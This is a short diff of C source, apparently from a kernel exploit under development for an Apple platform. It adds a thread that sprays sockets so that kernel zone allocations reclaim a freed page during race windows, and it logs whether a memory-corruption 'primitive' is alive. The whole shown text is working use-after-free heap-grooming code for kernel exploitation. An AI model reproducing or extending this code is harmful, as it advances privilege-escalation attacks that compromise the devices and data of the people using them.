@@ -1536,6 +1536,18 @@ static CFNumberRef RCNUM(int64_t v) {
         if (warmN && cand14N < 8) cand14[cand14N++] = rc_warm[warmN - 1];
         uint64_t vpat = 0x1337C0DE12345678ULL, vpat2 = ~vpat;
         uint32_t bound14 = 0, refused14 = 0, spray14 = 0, sprayOwn14 = 0, hits14 = 0, fpOurs14 = 0;
+        /* 2026-11-19 kernel-side reuse kicker (main-app receipt: v14 FOREIGN
+           windows all userspace-shaped, zero kptr-band). The main socket
+           spray was joined at the v9 boundary, so at re-race time NOTHING
+           kernel-side competed for the freed page — it was recycled by
+           page-cache/userspace allocations. One live inpcb/sbuff churner
+           for the v14 windows makes KERNEL zone memory take the freed
+           page instead. */
+        pthread_t thSpray2 = 0;
+        rc_sprayGo = 1;
+        if (pthread_create(&thSpray2, NULL, rc_socket_spray_thread, NULL) == 0)
+            rc_log("[v14] kernel-side socket churn live for the reclaim windows");
+        else { rc_sprayGo = 0; rc_log("[v14] spray re-arm failed — reclaim runs without kernel churn (honest)"); }
         for (uint32_t ci = 0; ci < cand14N; ci++) {
             if (rc_swap_dead) break;
             uint64_t off = cand14[ci];
@@ -1631,6 +1643,9 @@ static CFNumberRef RCNUM(int64_t v) {
             LabBanditRecordFeat("cscali", g_rcUntagged ? 1 : 0,
                                 LABB_SIG_FOREIGN, LABB_E_DEVICE, fe14, 2);
         }
+        /* stop the kernel-side churner before teardown */
+        rc_sprayGo = 0;
+        if (thSpray2) pthread_join(thSpray2, NULL);
     }
 
     rc_log("READ: WRONG/FOREIGN on either path = primitive alive.");
